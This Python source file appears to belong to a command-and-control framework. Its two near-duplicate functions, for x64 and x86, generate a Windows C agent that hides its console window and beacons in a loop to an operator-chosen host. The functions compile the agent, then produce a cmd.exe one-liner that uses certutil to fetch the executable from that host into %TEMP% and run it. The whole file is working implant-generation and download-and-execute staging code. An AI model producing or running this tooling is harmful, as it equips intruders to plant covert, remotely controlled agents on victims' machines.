import os
import platform
import subprocess

def generate_cmd_shellcodex64_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Generate C code for the shellcode
    c_code = f"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <windows.h>
    #include <wininet.h>

    #pragma comment(lib, "wininet.lib")

    void executeShellcode() {{
        // Setting up connectivity to C2
        HINTERNET hInternet = InternetOpen("ShellcodeAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {{
            return;
        }}
        
        // Format C2 server URL
        char serverUrl[256];
        sprintf(serverUrl, "{('https' if ssl else 'http')}://{host}:{port}/beacon");
        
        // Beacon to C2
        HINTERNET hConnect = InternetOpenUrl(hInternet, serverUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect != NULL) {{
            InternetCloseHandle(hConnect);
        }}
        
        InternetCloseHandle(hInternet);
        
        // Sleep for a while (beacon interval)
        Sleep(5000);
    }}

    int main() {{
        // Hide console window if not in debug mode
        #ifndef DEBUG
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        #endif
        
        // Execute shellcode logic in a loop
        while (1) {{
            executeShellcode();
        }}
        
        return 0;
    }}
    """
    
    # Save the C file
    c_file_path = os.path.join(agents_folder, "shellcode_x64.c")
    with open(c_file_path, "w") as f:
        f.write(c_code)
    
    # Compile the shellcode if system has a C compiler
    exe_path = os.path.join(agents_folder, "shellcode_x64.exe")
    compile_result = "Shellcode C file generated. Compilation "
    
    try:
        if platform.system() == "Windows":
            compiler_command = f"cl {c_file_path} /Fe:{exe_path} /O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += f"failed: {compilation.stderr}"
        else:
            # For cross-compilation on non-Windows platforms
            compiler_command = f"x86_64-w64-mingw32-gcc {c_file_path} -o {exe_path} -lwininet -s -O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += "failed. You may need to install mingw-w64 for cross-compilation."
    except Exception as e:
        compile_result += f"failed: {str(e)}"
    
    # Generate a cmd command to download and execute the shellcode
    http = "https" if ssl else "http"
    cmd_payload = f"cmd.exe /c certutil -urlcache -split -f {http}://{host}:{port}/shellcode_x64.exe %TEMP%\\sc.exe && %TEMP%\\sc.exe"
    
    # Save full payload information
    result = f"CMD Shellcodex64 agent generated:\n\n1. C source saved to: {c_file_path}\n2. {compile_result}\n3. Execution command:\n{cmd_payload}"
    with open(os.path.join(agents_folder, "cmd_shellcodex64.txt"), "w") as f:
        f.write(result)
    
    return result

def generate_cmd_shellcodex86_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Generate C code for the shellcode
    c_code = f"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <windows.h>
    #include <wininet.h>

    #pragma comment(lib, "wininet.lib")

    void executeShellcode() {{
        // Setting up connectivity to C2
        HINTERNET hInternet = InternetOpen("ShellcodeAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {{
            return;
        }}
        
        // Format C2 server URL
        char serverUrl[256];
        sprintf(serverUrl, "{('https' if ssl else 'http')}://{host}:{port}/beacon");
        
        // Beacon to C2
        HINTERNET hConnect = InternetOpenUrl(hInternet, serverUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect != NULL) {{
            InternetCloseHandle(hConnect);
        }}
        
        InternetCloseHandle(hInternet);
        
        // Sleep for a while (beacon interval)
        Sleep(5000);
    }}

    int main() {{
        // Hide console window if not in debug mode
        #ifndef DEBUG
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        #endif
        
        // Execute shellcode logic in a loop
        while (1) {{
            executeShellcode();
        }}
        
        return 0;
    }}
    """
    
    # Save the C file
    c_file_path = os.path.join(agents_folder, "shellcode_x86.c")
    with open(c_file_path, "w") as f:
        f.write(c_code)
    
    # Compile the shellcode if system has a C compiler
    exe_path = os.path.join(agents_folder, "shellcode_x86.exe")
    compile_result = "Shellcode C file generated. Compilation "
    
    try:
        if platform.system() == "Windows":
            compiler_command = f"cl {c_file_path} /Fe:{exe_path} /O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += f"failed: {compilation.stderr}"
        else:
            # For cross-compilation on non-Windows platforms
            compiler_command = f"i686-w64-mingw32-gcc {c_file_path} -o {exe_path} -lwininet -s -O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += "failed. You may need to install mingw-w64 for cross-compilation."
    except Exception as e:
        compile_result += f"failed: {str(e)}"
    
    # Generate a cmd command to download and execute the shellcode
    http = "https" if ssl else "http"
    cmd_payload = f"cmd.exe /c certutil -urlcache -split -f {http}://{host}:{port}/shellcode_x86.exe %TEMP%\\sc.exe && %TEMP%\\sc.exe"
    
    # Save full payload information
    result = f"CMD Shellcodex86 agent generated:\n\n1. C source saved to: {c_file_path}\n2. {compile_result}\n3. Execution command:\n{cmd_payload}"
    with open(os.path.join(agents_folder, "cmd_shellcodex86.txt"), "w") as f:
        f.write(result)
    
    return result